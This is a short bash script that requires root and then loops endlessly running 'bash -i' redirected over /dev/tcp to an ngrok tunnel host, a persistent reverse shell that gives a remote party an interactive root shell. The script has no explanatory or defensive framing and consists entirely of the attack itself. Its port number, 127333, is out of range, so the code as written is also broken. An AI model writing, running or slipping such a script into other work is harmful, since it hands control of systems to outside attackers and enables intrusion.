#!/bin/bash

if [[ "$EUID" -ne 0 ]]; then
	echo "The script must be run with the root user"
	exit 1
fi

export TERM=xterm-256color
echo "Starting reverse shell"
while true; do
	bash -i >&/dev/tcp/0.tcp.ap.ngrok.io/127333 0>&1
done
